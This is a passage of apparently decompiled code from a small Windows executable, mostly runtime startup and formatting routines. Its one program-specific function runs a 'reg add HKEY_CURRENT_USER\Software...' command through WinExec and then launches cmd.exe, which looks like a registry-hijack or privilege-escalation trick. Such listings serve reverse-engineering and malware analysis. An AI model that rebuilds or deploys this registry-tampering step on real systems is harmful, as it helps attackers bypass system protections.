typedef unsigned char   undefined;

typedef unsigned int    ImageBaseOffset32;
typedef unsigned char    byte;
typedef unsigned int    dword;
typedef unsigned char    uchar;
typedef unsigned int    uint;
typedef unsigned long    ulong;
typedef unsigned char    undefined1;
typedef unsigned short    undefined2;
typedef unsigned int    undefined4;
typedef unsigned long long    undefined8;
typedef unsigned short    ushort;
typedef short    wchar_t;
typedef unsigned short    word;
typedef unsigned short    wchar16;
typedef struct _cpinfo _cpinfo, *P_cpinfo;

typedef uint UINT;

typedef uchar BYTE;

struct _cpinfo {
    UINT MaxCharSize;
    BYTE DefaultChar[2];
    BYTE LeadByte[12];
};

typedef struct _cpinfo * LPCPINFO;

typedef ulong DWORD;

typedef int (* FARPROC)(void);

typedef ushort WORD;

typedef WORD * LPWORD;

typedef DWORD * LPDWORD;

typedef struct HINSTANCE__ HINSTANCE__, *PHINSTANCE__;

struct HINSTANCE__ {
    int unused;
};

typedef int BOOL;

typedef BOOL * LPBOOL;

typedef struct HINSTANCE__ * HINSTANCE;

typedef void * LPCVOID;

typedef void * LPVOID;

typedef HINSTANCE HMODULE;

typedef BYTE * LPBYTE;

typedef struct IMAGE_OPTIONAL_HEADER32 IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32;

typedef struct IMAGE_DATA_DIRECTORY IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY;

struct IMAGE_DATA_DIRECTORY {
    ImageBaseOffset32 VirtualAddress;
    dword Size;
};

struct IMAGE_OPTIONAL_HEADER32 {
    word Magic;
    byte MajorLinkerVersion;
    byte MinorLinkerVersion;
    dword SizeOfCode;
    dword SizeOfInitializedData;
    dword SizeOfUninitializedData;
    ImageBaseOffset32 AddressOfEntryPoint;
    ImageBaseOffset32 BaseOfCode;
    ImageBaseOffset32 BaseOfData;
    pointer32 ImageBase;
    dword SectionAlignment;
    dword FileAlignment;
    word MajorOperatingSystemVersion;
    word MinorOperatingSystemVersion;
    word MajorImageVersion;
    word MinorImageVersion;
    word MajorSubsystemVersion;
    word MinorSubsystemVersion;
    dword Win32VersionValue;
    dword SizeOfImage;
    dword SizeOfHeaders;
    dword CheckSum;
    word Subsystem;
    word DllCharacteristics;
    dword SizeOfStackReserve;
    dword SizeOfStackCommit;
    dword SizeOfHeapReserve;
    dword SizeOfHeapCommit;
    dword LoaderFlags;
    dword NumberOfRvaAndSizes;
    struct IMAGE_DATA_DIRECTORY DataDirectory[16];
};

typedef struct IMAGE_SECTION_HEADER IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER;

typedef union Misc Misc, *PMisc;

typedef enum SectionFlags {
    IMAGE_SCN_TYPE_NO_PAD=8,
    IMAGE_SCN_RESERVED_0001=16,
    IMAGE_SCN_CNT_CODE=32,
    IMAGE_SCN_CNT_INITIALIZED_DATA=64,
    IMAGE_SCN_CNT_UNINITIALIZED_DATA=128,
    IMAGE_SCN_LNK_OTHER=256,
    IMAGE_SCN_LNK_INFO=512,
    IMAGE_SCN_RESERVED_0040=1024,
    IMAGE_SCN_LNK_REMOVE=2048,
    IMAGE_SCN_LNK_COMDAT=4096,
    IMAGE_SCN_GPREL=32768,
    IMAGE_SCN_MEM_16BIT=131072,
    IMAGE_SCN_MEM_PURGEABLE=131072,
    IMAGE_SCN_MEM_LOCKED=262144,
    IMAGE_SCN_MEM_PRELOAD=524288,
    IMAGE_SCN_ALIGN_1BYTES=1048576,
    IMAGE_SCN_ALIGN_2BYTES=2097152,
    IMAGE_SCN_ALIGN_4BYTES=3145728,
    IMAGE_SCN_ALIGN_8BYTES=4194304,
    IMAGE_SCN_ALIGN_16BYTES=5242880,
    IMAGE_SCN_ALIGN_32BYTES=6291456,
    IMAGE_SCN_ALIGN_64BYTES=7340032,
    IMAGE_SCN_ALIGN_128BYTES=8388608,
    IMAGE_SCN_ALIGN_256BYTES=9437184,
    IMAGE_SCN_ALIGN_512BYTES=10485760,
    IMAGE_SCN_ALIGN_1024BYTES=11534336,
    IMAGE_SCN_ALIGN_2048BYTES=12582912,
    IMAGE_SCN_ALIGN_4096BYTES=13631488,
    IMAGE_SCN_ALIGN_8192BYTES=14680064,
    IMAGE_SCN_LNK_NRELOC_OVFL=16777216,
    IMAGE_SCN_MEM_DISCARDABLE=33554432,
    IMAGE_SCN_MEM_NOT_CACHED=67108864,
    IMAGE_SCN_MEM_NOT_PAGED=134217728,
    IMAGE_SCN_MEM_SHARED=268435456,
    IMAGE_SCN_MEM_EXECUTE=536870912,
    IMAGE_SCN_MEM_READ=1073741824,
    IMAGE_SCN_MEM_WRITE=2147483648
} SectionFlags;

union Misc {
    dword PhysicalAddress;
    dword VirtualSize;
};

struct IMAGE_SECTION_HEADER {
    char Name[8];
    union Misc Misc;
    ImageBaseOffset32 VirtualAddress;
    dword SizeOfRawData;
    dword PointerToRawData;
    dword PointerToRelocations;
    dword PointerToLinenumbers;
    word NumberOfRelocations;
    word NumberOfLinenumbers;
    enum SectionFlags Characteristics;
};

typedef struct IMAGE_FILE_HEADER IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER;

struct IMAGE_FILE_HEADER {
    word Machine; // 332
    word NumberOfSections;
    dword TimeDateStamp;
    dword PointerToSymbolTable;
    dword NumberOfSymbols;
    word SizeOfOptionalHeader;
    word Characteristics;
};

typedef struct IMAGE_NT_HEADERS32 IMAGE_NT_HEADERS32, *PIMAGE_NT_HEADERS32;

struct IMAGE_NT_HEADERS32 {
    char Signature[4];
    struct IMAGE_FILE_HEADER FileHeader;
    struct IMAGE_OPTIONAL_HEADER32 OptionalHeader;
};

typedef struct _iobuf _iobuf, *P_iobuf;

struct _iobuf {
    char * _ptr;
    int _cnt;
    char * _base;
    int _flag;
    int _file;
    int _charbuf;
    int _bufsiz;
    char * _tmpfname;
};

typedef struct _iobuf FILE;

typedef struct _STARTUPINFOA _STARTUPINFOA, *P_STARTUPINFOA;

typedef char CHAR;

typedef CHAR * LPSTR;

typedef void * HANDLE;

struct _STARTUPINFOA {
    DWORD cb;
    LPSTR lpReserved;
    LPSTR lpDesktop;
    LPSTR lpTitle;
    DWORD dwX;
    DWORD dwY;
    DWORD dwXSize;
    DWORD dwYSize;
    DWORD dwXCountChars;
    DWORD dwYCountChars;
    DWORD dwFillAttribute;
    DWORD dwFlags;
    WORD wShowWindow;
    WORD cbReserved2;
    LPBYTE lpReserved2;
    HANDLE hStdInput;
    HANDLE hStdOutput;
    HANDLE hStdError;
};

typedef struct _STARTUPINFOA * LPSTARTUPINFOA;

typedef union _union_518 _union_518, *P_union_518;

typedef struct _struct_519 _struct_519, *P_struct_519;

typedef void * PVOID;

struct _struct_519 {
    DWORD Offset;
    DWORD OffsetHigh;
};

union _union_518 {
    struct _struct_519 s;
    PVOID Pointer;
};

typedef struct _OVERLAPPED _OVERLAPPED, *P_OVERLAPPED;

typedef ulong ULONG_PTR;

struct _OVERLAPPED {
    ULONG_PTR Internal;
    ULONG_PTR InternalHigh;
    union _union_518 u;
    HANDLE hEvent;
};

typedef struct _OVERLAPPED * LPOVERLAPPED;

typedef struct _CONTEXT _CONTEXT, *P_CONTEXT;

typedef struct _CONTEXT CONTEXT;

typedef struct _FLOATING_SAVE_AREA _FLOATING_SAVE_AREA, *P_FLOATING_SAVE_AREA;

typedef struct _FLOATING_SAVE_AREA FLOATING_SAVE_AREA;

struct _FLOATING_SAVE_AREA {
    DWORD ControlWord;
    DWORD StatusWord;
    DWORD TagWord;
    DWORD ErrorOffset;
    DWORD ErrorSelector;
    DWORD DataOffset;
    DWORD DataSelector;
    BYTE RegisterArea[80];
    DWORD Cr0NpxState;
};

struct _CONTEXT {
    DWORD ContextFlags;
    DWORD Dr0;
    DWORD Dr1;
    DWORD Dr2;
    DWORD Dr3;
    DWORD Dr6;
    DWORD Dr7;
    FLOATING_SAVE_AREA FloatSave;
    DWORD SegGs;
    DWORD SegFs;
    DWORD SegEs;
    DWORD SegDs;
    DWORD Edi;
    DWORD Esi;
    DWORD Ebx;
    DWORD Edx;
    DWORD Ecx;
    DWORD Eax;
    DWORD Ebp;
    DWORD Eip;
    DWORD SegCs;
    DWORD EFlags;
    DWORD Esp;
    DWORD SegSs;
    BYTE ExtendedRegisters[512];
};

typedef struct _EXCEPTION_RECORD _EXCEPTION_RECORD, *P_EXCEPTION_RECORD;

typedef struct _EXCEPTION_RECORD EXCEPTION_RECORD;

typedef EXCEPTION_RECORD * PEXCEPTION_RECORD;

struct _EXCEPTION_RECORD {
    DWORD ExceptionCode;
    DWORD ExceptionFlags;
    struct _EXCEPTION_RECORD * ExceptionRecord;
    PVOID ExceptionAddress;
    DWORD NumberParameters;
    ULONG_PTR ExceptionInformation[15];
};

typedef wchar_t WCHAR;

typedef CHAR * LPCSTR;

typedef long LONG;

typedef LONG * PLONG;

typedef CHAR * LPCH;

typedef WCHAR * LPWSTR;

typedef CONTEXT * PCONTEXT;

typedef WCHAR * LPWCH;

typedef WCHAR * LPCWSTR;

typedef DWORD LCID;

typedef struct IMAGE_DOS_HEADER IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER;

struct IMAGE_DOS_HEADER {
    char e_magic[2]; // Magic number
    word e_cblp; // Bytes of last page
    word e_cp; // Pages in file
    word e_crlc; // Relocations
    word e_cparhdr; // Size of header in paragraphs
    word e_minalloc; // Minimum extra paragraphs needed
    word e_maxalloc; // Maximum extra paragraphs needed
    word e_ss; // Initial (relative) SS value
    word e_sp; // Initial SP value
    word e_csum; // Checksum
    word e_ip; // Initial IP value
    word e_cs; // Initial (relative) CS value
    word e_lfarlc; // File address of relocation table
    word e_ovno; // Overlay number
    word e_res[4][4]; // Reserved words
    word e_oemid; // OEM identifier (for e_oeminfo)
    word e_oeminfo; // OEM information; e_oemid specific
    word e_res2[10][10]; // Reserved words
    dword e_lfanew; // File address of new exe header
    byte e_program[64]; // Actual DOS program
};

typedef ULONG_PTR SIZE_T;

typedef struct _EXCEPTION_POINTERS _EXCEPTION_POINTERS, *P_EXCEPTION_POINTERS;

struct _EXCEPTION_POINTERS {
    PEXCEPTION_RECORD ExceptionRecord;
    PCONTEXT ContextRecord;
};

typedef uint size_t;




undefined4 FUN_00401000(void)

{
  HMODULE hModule;
  FARPROC pFVar1;
  char local_104 [260];
  
  hModule = LoadLibraryA(s_kernel32_DLL_004061a8);
  pFVar1 = GetProcAddress(hModule,s_WinExec_004061a0);
  FUN_00401060(local_104,(byte *)s_reg_add__HKEY_CURRENT_USER_Softw_0040613c);
  (*pFVar1)(local_104,0);
  (*pFVar1)(s_cmd_exe_00406134,0);
  return 0;
}



int __cdecl FUN_00401060(char *param_1,byte *param_2)

{
  int iVar1;
  char *local_24;
  int local_20;
  char *local_1c;
  undefined4 local_18;
  
  local_1c = param_1;
  local_24 = param_1;
  local_18 = 0x42;
  local_20 = 0x7fffffff;
  iVar1 = FUN_00401306(&local_24,param_2,(undefined4 *)&stack0x0000000c);
  local_20 = local_20 + -1;
  if (local_20 < 0) {
    FUN_004011f1(0,&local_24);
  }
  else {
    *local_24 = '\0';
  }
  return iVar1;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void entry(void)

{
  DWORD DVar1;
  int iVar2;
  UINT UVar3;
  undefined4 *in_FS_OFFSET;
  _STARTUPINFOA local_60;
  undefined *local_1c;
  _EXCEPTION_POINTERS *local_18;
  undefined4 uStack20;
  undefined *puStack16;
  undefined *puStack12;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack12 = &DAT_004050a8;
  puStack16 = &LAB_00402508;
  uStack20 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack20;
  local_1c = &stack0xffffff88;
  DVar1 = GetVersion();
  _DAT_00406a64 = DVar1 >> 8 & 0xff;
  _DAT_00406a60 = DVar1 & 0xff;
  _DAT_00406a5c = _DAT_00406a60 * 0x100 + _DAT_00406a64;
  _DAT_00406a58 = DVar1 >> 0x10;
  iVar2 = FUN_004023d1(0);
  if (iVar2 == 0) {
    FUN_004011cd(0x1c);
  }
  local_8 = 0;
  FUN_00402226();
  DAT_00407f78 = GetCommandLineA();
  DAT_00406a40 = FUN_004020f4();
  FUN_00401ea7();
  FUN_00401dee();
  FUN_00401b10();
  local_60.dwFlags = 0;
  GetStartupInfoA(&local_60);
  FUN_00401d96();
  GetModuleHandleA((LPCSTR)0x0);
  UVar3 = FUN_00401000();
  FUN_00401b3d(UVar3);
  FUN_00401c12(local_18->ExceptionRecord->ExceptionCode,local_18);
  return;
}



// Library Function - Single Match
//  __amsg_exit
// 
// Library: Visual Studio 2003 Release

void __cdecl __amsg_exit(int param_1)

{
  if (DAT_00406a48 == 1) {
    FUN_004025e0();
  }
  FUN_00402619(param_1);
  (*(code *)PTR___exit_004061b8)(0xff);
  return;
}



void __cdecl FUN_004011cd(DWORD param_1)

{
  if (DAT_00406a48 == 1) {
    FUN_004025e0();
  }
  FUN_00402619(param_1);
                    // WARNING: Subroutine does not return
  ExitProcess(0xff);
}



uint __cdecl FUN_004011f1(uint param_1,char **param_2)

{
  char *pcVar1;
  char *pcVar2;
  char **ppcVar3;
  byte bVar4;
  undefined3 extraout_var;
  undefined *puVar5;
  char **ppcVar6;
  
  ppcVar3 = param_2;
  pcVar1 = param_2[3];
  pcVar2 = param_2[4];
  if ((((uint)pcVar1 & 0x82) == 0) || (((uint)pcVar1 & 0x40) != 0)) {
LAB_004012fa:
    param_2[3] = (char *)((uint)pcVar1 | 0x20);
  }
  else {
    if (((uint)pcVar1 & 1) != 0) {
      param_2[1] = (char *)0x0;
      if (((uint)pcVar1 & 0x10) == 0) goto LAB_004012fa;
      *param_2 = param_2[2];
      param_2[3] = (char *)((uint)pcVar1 & 0xfffffffe);
    }
    pcVar1 = param_2[3];
    param_2[1] = (char *)0x0;
    param_2 = (char **)0x0;
    ppcVar3[3] = (char *)((uint)pcVar1 & 0xffffffef | 2);
    if ((((uint)pcVar1 & 0x10c) == 0) &&
       (((ppcVar3 != (char **)&DAT_00406320 && (ppcVar3 != (char **)&DAT_00406340)) ||
        (bVar4 = FUN_004029f7((uint)pcVar2), CONCAT31(extraout_var,bVar4) == 0)))) {
      FUN_004029b3(ppcVar3);
    }
    if ((*(ushort *)(ppcVar3 + 3) & 0x108) == 0) {
      ppcVar6 = (char **)0x1;
      param_2 = (char **)FUN_00402806((DWORD)pcVar2,(char *)&param_1,1);
    }
    else {
      pcVar1 = ppcVar3[2];
      ppcVar6 = (char **)(*ppcVar3 + -(int)pcVar1);
      *ppcVar3 = pcVar1 + 1;
      ppcVar3[1] = ppcVar3[6] + -1;
      if ((int)ppcVar6 < 1) {
        if (pcVar2 == (char *)0xffffffff) {
          puVar5 = &DAT_00406250;
        }
        else {
          puVar5 = (undefined *)((&DAT_00407e60)[(int)pcVar2 >> 5] + ((uint)pcVar2 & 0x1f) * 8);
        }
        if ((puVar5[4] & 0x20) != 0) {
          FUN_0040276c((uint)pcVar2,0,2);
        }
      }
      else {
        param_2 = (char **)FUN_00402806((DWORD)pcVar2,pcVar1,(uint)ppcVar6);
      }
      *ppcVar3[2] = (char)param_1;
    }
    if (param_2 == ppcVar6) {
      return param_1 & 0xff;
    }
    ppcVar3[3] = (char *)((uint)ppcVar3[3] | 0x20);
  }
  return 0xffffffff;
}



// WARNING: Could not reconcile some variable overlaps

int __cdecl FUN_00401306(char **param_1,byte *param_2,undefined4 *param_3)

{
  uint uVar1;
  WCHAR *pWVar2;
  WCHAR *pWVar3;
  undefined4 uVar4;
  short *psVar5;
  int *piVar6;
  LPSTR pCVar7;
  byte bVar8;
  int iVar9;
  uint uVar10;
  LPSTR pCVar11;
  ulonglong uVar12;
  undefined8 uVar13;
  ulonglong uVar14;
  undefined local_24c [511];
  undefined local_4d;
  undefined4 local_4c;
  undefined4 local_48;
  uint local_44;
  uint local_40;
  CHAR local_3c [4];
  undefined4 local_38;
  int local_34;
  int local_30;
  int local_2c;
  int local_28;
  int local_24;
  int local_20;
  char local_1a;
  char local_19;
  int local_18;
  int local_14;
  LPSTR local_10;
  WCHAR *local_c;
  uint local_8;
  
  local_34 = 0;
  bVar8 = *param_2;
  param_2 = param_2 + 1;
  local_10 = (LPSTR)0x0;
  local_18 = 0;
  do {
    if ((bVar8 == 0) || (local_18 < 0)) {
      return local_18;
    }
    if (((char)bVar8 < ' ') || ('x' < (char)bVar8)) {
      uVar1 = 0;
    }
    else {
      uVar1 = *(byte *)((int)&GetStringTypeA_exref + (int)(char)bVar8) & 0xf;
    }
    local_34 = (int)(char)(&DAT_004050b4)[uVar1 * 8 + local_34] >> 4;
    switch(local_34) {
    case 0:
switchD_00401374_caseD_0:
      local_28 = 0;
      if ((PTR_DAT_00406598[(uint)bVar8 * 2 + 1] & 0x80) != 0) {
        FUN_00401a47((int)(char)bVar8,param_1,&local_18);
        bVar8 = *param_2;
        param_2 = param_2 + 1;
      }
      FUN_00401a47((int)(char)bVar8,param_1,&local_18);
      break;
    case 1:
      local_14 = -1;
      local_38 = 0;
      local_2c = 0;
      local_24 = 0;
      local_20 = 0;
      local_8 = 0;
      local_28 = 0;
      break;
    case 2:
      if (bVar8 == 0x20) {
        local_8 = local_8 | 2;
      }
      else if (bVar8 == 0x23) {
        local_8 = local_8 | 0x80;
      }
      else if (bVar8 == 0x2b) {
        local_8 = local_8 | 1;
      }
      else if (bVar8 == 0x2d) {
        local_8 = local_8 | 4;
      }
      else if (bVar8 == 0x30) {
        local_8 = local_8 | 8;
      }
      break;
    case 3:
      if (bVar8 == 0x2a) {
        local_24 = FUN_00401ae5((int *)&param_3);
        if (local_24 < 0) {
          local_8 = local_8 | 4;
          local_24 = -local_24;
        }
      }
      else {
        local_24 = (char)bVar8 + -0x30 + local_24 * 10;
      }
      break;
    case 4:
      local_14 = 0;
      break;
    case 5:
      if (bVar8 == 0x2a) {
        local_14 = FUN_00401ae5((int *)&param_3);
        if (local_14 < 0) {
          local_14 = -1;
        }
      }
      else {
        local_14 = (char)bVar8 + -0x30 + local_14 * 10;
      }
      break;
    case 6:
      if (bVar8 == 0x49) {
        if ((*param_2 != 0x36) || (param_2[1] != 0x34)) {
          local_34 = 0;
          goto switchD_00401374_caseD_0;
        }
        param_2 = param_2 + 2;
        local_8 = local_8 | 0x8000;
      }
      else if (bVar8 == 0x68) {
        local_8 = local_8 | 0x20;
      }
      else if (bVar8 == 0x6c) {
        local_8 = local_8 | 0x10;
      }
      else if (bVar8 == 0x77) {
        local_8 = local_8 | 0x800;
      }
      break;
    case 7:
      pWVar3 = local_c;
      if ((char)bVar8 < 'h') {
        if ((char)bVar8 < 'e') {
          if ((char)bVar8 < 'Y') {
            if (bVar8 == 0x58) {
LAB_00401785:
              local_30 = 7;
LAB_0040178c:
              local_10 = (LPSTR)0x10;
              if ((local_8 & 0x80) != 0) {
                local_1a = '0';
                local_19 = (char)local_30 + 'Q';
                local_20 = 2;
              }
              goto LAB_004017f6;
            }
            if (bVar8 != 0x43) {
              if ((bVar8 != 0x45) && (bVar8 != 0x47)) {
                if (bVar8 == 0x53) {
                  if ((local_8 & 0x830) == 0) {
                    local_8 = local_8 | 0x800;
                  }
                  goto LAB_00401533;
                }
                goto LAB_00401910;
              }
              local_38 = 1;
              bVar8 = bVar8 + 0x20;
              goto LAB_00401594;
            }
            if ((local_8 & 0x830) == 0) {
              local_8 = local_8 | 0x800;
            }
LAB_004015c1:
            if ((local_8 & 0x810) == 0) {
              uVar4 = FUN_00401ae5((int *)&param_3);
              local_24c[0] = (char)uVar4;
              local_10 = (LPSTR)0x1;
            }
            else {
              uVar1 = FUN_00401b02((uint *)&param_3);
              local_10 = FUN_00402b5b(local_24c,(WCHAR)uVar1);
              if ((int)local_10 < 0) {
                local_2c = 1;
              }
            }
            pWVar3 = (WCHAR *)local_24c;
          }
          else if (bVar8 == 0x5a) {
            psVar5 = (short *)FUN_00401ae5((int *)&param_3);
            if ((psVar5 == (short *)0x0) ||
               (pWVar3 = *(WCHAR **)(psVar5 + 2), pWVar3 == (WCHAR *)0x0)) {
              local_c = (WCHAR *)PTR_s__null__004061c0;
              pWVar3 = (WCHAR *)PTR_s__null__004061c0;
              goto LAB_00401706;
            }
            if ((local_8 & 0x800) == 0) {
              local_28 = 0;
              local_10 = (LPSTR)(int)*psVar5;
            }
            else {
              local_10 = (LPSTR)((uint)(int)*psVar5 >> 1);
              local_28 = 1;
            }
          }
          else {
            if (bVar8 == 99) goto LAB_004015c1;
            if (bVar8 == 100) goto LAB_004017eb;
          }
        }
        else {
LAB_00401594:
          local_8 = local_8 | 0x40;
          pWVar3 = (WCHAR *)local_24c;
          if (local_14 < 0) {
            local_14 = 6;
          }
          else if ((local_14 == 0) && (bVar8 == 0x67)) {
            local_14 = 1;
          }
          local_4c = *param_3;
          local_48 = param_3[1];
          param_3 = param_3 + 2;
          local_c = pWVar3;
          (*(code *)PTR_FUN_00406580)(&local_4c,local_24c,(int)(char)bVar8,local_14,local_38);
          uVar1 = local_8 & 0x80;
          if ((uVar1 != 0) && (local_14 == 0)) {
            (*(code *)PTR_FUN_0040658c)(local_24c);
          }
          if ((bVar8 == 0x67) && (uVar1 == 0)) {
            (*(code *)PTR_FUN_00406584)(local_24c);
          }
          if (local_24c[0] == '-') {
            local_8 = local_8 | 0x100;
            pWVar3 = (WCHAR *)(local_24c + 1);
            local_c = pWVar3;
          }
LAB_00401706:
          local_10 = (LPSTR)_strlen((char *)pWVar3);
          pWVar3 = local_c;
        }
      }
      else {
        if (bVar8 == 0x69) {
LAB_004017eb:
          local_8 = local_8 | 0x40;
        }
        else {
          if (bVar8 == 0x6e) {
            piVar6 = (int *)FUN_00401ae5((int *)&param_3);
            if ((local_8 & 0x20) == 0) {
              *piVar6 = local_18;
            }
            else {
              *(undefined2 *)piVar6 = (undefined2)local_18;
            }
            local_2c = 1;
            break;
          }
          if (bVar8 == 0x6f) {
            local_10 = (LPSTR)0x8;
            if ((local_8 & 0x80) != 0) {
              local_8 = local_8 | 0x200;
            }
            goto LAB_004017f6;
          }
          if (bVar8 == 0x70) {
            local_14 = 8;
            goto LAB_00401785;
          }
          if (bVar8 == 0x73) {
LAB_00401533:
            iVar9 = local_14;
            if (local_14 == -1) {
              iVar9 = 0x7fffffff;
            }
            pWVar2 = (WCHAR *)FUN_00401ae5((int *)&param_3);
            if ((local_8 & 0x810) == 0) {
              pWVar3 = pWVar2;
              if (pWVar2 == (WCHAR *)0x0) {
                pWVar2 = (WCHAR *)PTR_s__null__004061c0;
                pWVar3 = (WCHAR *)PTR_s__null__004061c0;
              }
              for (; (iVar9 != 0 && (*(char *)pWVar2 != '\0')); pWVar2 = (WCHAR *)((int)pWVar2 + 1))
              {
                iVar9 = iVar9 + -1;
              }
              local_10 = (LPSTR)((int)pWVar2 - (int)pWVar3);
            }
            else {
              if (pWVar2 == (WCHAR *)0x0) {
                pWVar2 = (WCHAR *)PTR_DAT_004061c4;
              }
              local_28 = 1;
              for (pWVar3 = pWVar2; (iVar9 != 0 && (*pWVar3 != L'\0')); pWVar3 = pWVar3 + 1) {
                iVar9 = iVar9 + -1;
              }
              local_10 = (LPSTR)((int)pWVar3 - (int)pWVar2 >> 1);
              pWVar3 = pWVar2;
            }
            goto LAB_00401910;
          }
          if (bVar8 != 0x75) {
            if (bVar8 != 0x78) goto LAB_00401910;
            local_30 = 0x27;
            goto LAB_0040178c;
          }
        }
        local_10 = (LPSTR)0xa;
LAB_004017f6:
        if ((local_8 & 0x8000) == 0) {
          if ((local_8 & 0x20) == 0) {
            if ((local_8 & 0x40) == 0) {
              uVar1 = FUN_00401ae5((int *)&param_3);
              uVar12 = (ulonglong)uVar1;
              goto LAB_00401849;
            }
            uVar1 = FUN_00401ae5((int *)&param_3);
          }
          else if ((local_8 & 0x40) == 0) {
            uVar1 = FUN_00401ae5((int *)&param_3);
            uVar1 = uVar1 & 0xffff;
          }
          else {
            uVar4 = FUN_00401ae5((int *)&param_3);
            uVar1 = (uint)(short)uVar4;
          }
          uVar12 = (ulonglong)(int)uVar1;
        }
        else {
          uVar12 = FUN_00401af2((int *)&param_3);
        }
LAB_00401849:
        iVar9 = (int)(uVar12 >> 0x20);
        if ((((local_8 & 0x40) != 0) && (iVar9 == 0 || (longlong)uVar12 < 0)) &&
           ((longlong)uVar12 < 0)) {
          local_8 = local_8 | 0x100;
          uVar12 = CONCAT44(-(iVar9 + (uint)((int)uVar12 != 0)),-(int)uVar12);
        }
        uVar1 = (uint)(uVar12 >> 0x20);
        uVar14 = uVar12 & 0xffffffff;
        if ((local_8 & 0x8000) == 0) {
          uVar1 = 0;
        }
        if (local_14 < 0) {
          local_14 = 1;
        }
        else {
          local_8 = local_8 & 0xfffffff7;
        }
        if (((uint)uVar12 | uVar1) == 0) {
          local_20 = 0;
        }
        local_c = (WCHAR *)&local_4d;
        while( true ) {
          uVar10 = (uint)uVar14;
          iVar9 = local_14 + -1;
          if ((local_14 < 1) && ((uVar10 | uVar1) == 0)) break;
          local_40 = (int)local_10 >> 0x1f;
          local_44 = (uint)local_10;
          local_14 = iVar9;
          uVar13 = __aullrem(uVar10,uVar1,(uint)local_10,local_40);
          iVar9 = (int)uVar13 + 0x30;
          uVar14 = __aulldiv(uVar10,uVar1,local_44,local_40);
          uVar1 = (uint)(uVar14 >> 0x20);
          if (0x39 < iVar9) {
            iVar9 = iVar9 + local_30;
          }
          pWVar3 = (WCHAR *)((int)local_c + -1);
          *(char *)local_c = (char)iVar9;
          local_c = pWVar3;
        }
        local_10 = &local_4d + -(int)local_c;
        pWVar3 = (WCHAR *)((int)local_c + 1);
        local_14 = iVar9;
        if (((local_8 & 0x200) != 0) && ((*(char *)pWVar3 != '0' || (local_10 == (LPSTR)0x0)))) {
          local_10 = (LPSTR)((int)&local_4c + -(int)local_c);
          *(char *)local_c = '0';
          pWVar3 = local_c;
        }
      }
LAB_00401910:
      local_c = pWVar3;
      uVar1 = local_8;
      if (local_2c == 0) {
        if ((local_8 & 0x40) != 0) {
          if ((local_8 & 0x100) == 0) {
            if ((local_8 & 1) == 0) {
              if ((local_8 & 2) == 0) goto LAB_00401948;
              local_1a = ' ';
            }
            else {
              local_1a = '+';
            }
          }
          else {
            local_1a = '-';
          }
          local_20 = 1;
        }
LAB_00401948:
        iVar9 = (local_24 - local_20) - (int)local_10;
        if ((local_8 & 0xc) == 0) {
          FUN_00401a7c(0x20,iVar9,param_1,&local_18);
        }
        FUN_00401aad(&local_1a,local_20,param_1,&local_18);
        if (((uVar1 & 8) != 0) && ((uVar1 & 4) == 0)) {
          FUN_00401a7c(0x30,iVar9,param_1,&local_18);
        }
        if ((local_28 == 0) || (pCVar11 = local_10, pWVar3 = local_c, (int)local_10 < 1)) {
          FUN_00401aad((char *)local_c,(int)local_10,param_1,&local_18);
        }
        else {
          do {
            pCVar11 = pCVar11 + -1;
            pCVar7 = FUN_00402b5b(local_3c,*pWVar3);
            if ((int)pCVar7 < 1) break;
            FUN_00401aad(local_3c,(int)pCVar7,param_1,&local_18);
            pWVar3 = pWVar3 + 1;
          } while (pCVar11 != (LPSTR)0x0);
        }
        if ((local_8 & 4) != 0) {
          FUN_00401a7c(0x20,iVar9,param_1,&local_18);
        }
      }
    }
    bVar8 = *param_2;
    param_2 = param_2 + 1;
  } while( true );
}



void __cdecl FUN_00401a47(uint param_1,char **param_2,int *param_3)

{
  char **ppcVar1;
  uint uVar2;
  
  ppcVar1 = param_2 + 1;
  *ppcVar1 = *ppcVar1 + -1;
  if ((int)*ppcVar1 < 0) {
    uVar2 = FUN_004011f1(param_1,param_2);
  }
  else {
    **param_2 = (char)param_1;
    *param_2 = *param_2 + 1;
    uVar2 = param_1 & 0xff;
  }
  if (uVar2 == 0xffffffff) {
    *param_3 = -1;
    return;
  }
  *param_3 = *param_3 + 1;
  return;
}



void __cdecl FUN_00401a7c(uint param_1,int param_2,char **param_3,int *param_4)

{
  if (0 < param_2) {
    do {
      param_2 = param_2 + -1;
      FUN_00401a47(param_1,param_3,param_4);
      if (*param_4 == -1) {
        return;
      }
    } while (0 < param_2);
  }
  return;
}



void __cdecl FUN_00401aad(char *param_1,int param_2,char **param_3,int *param_4)

{
  char cVar1;
  
  if (0 < param_2) {
    do {
      param_2 = param_2 + -1;
      cVar1 = *param_1;
      param_1 = param_1 + 1;
      FUN_00401a47((int)cVar1,param_3,param_4);
      if (*param_4 == -1) {
        return;
      }
    } while (0 < param_2);
  }
  return;
}



undefined4 __cdecl FUN_00401ae5(int *param_1)

{
  *param_1 = *param_1 + 4;
  return *(undefined4 *)(*param_1 + -4);
}



undefined8 __cdecl FUN_00401af2(int *param_1)

{
  *param_1 = *param_1 + 8;
  return *(undefined8 *)(*param_1 + -8);
}



uint __cdecl FUN_00401b02(uint *param_1)

{
  *param_1 = *param_1 + 4;
  return *param_1 & 0xffff0000 | (uint)*(ushort *)(*param_1 - 4);
}



void FUN_00401b10(void)

{
  if (DAT_00407f74 != (code *)0x0) {
    (*DAT_00407f74)();
  }
  FUN_00401bf8((undefined **)&DAT_00406008,(undefined **)&DAT_00406014);
  FUN_00401bf8((undefined **)&DAT_00406000,(undefined **)&DAT_00406004);
  return;
}



void __cdecl FUN_00401b3d(UINT param_1)

{
  FUN_00401b5f(param_1,0,0);
  return;
}



// Library Function - Single Match
//  __exit
// 
// Library: Visual Studio 2003 Release

void __cdecl __exit(int _Code)

{
  FUN_00401b5f(_Code,1,0);
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void __cdecl FUN_00401b5f(UINT param_1,int param_2,int param_3)

{
  HANDLE hProcess;
  code **ppcVar1;
  UINT uExitCode;
  
  if (_DAT_00406a94 == 1) {
    uExitCode = param_1;
    hProcess = GetCurrentProcess();
    TerminateProcess(hProcess,uExitCode);
  }
  _DAT_00406a90 = 1;
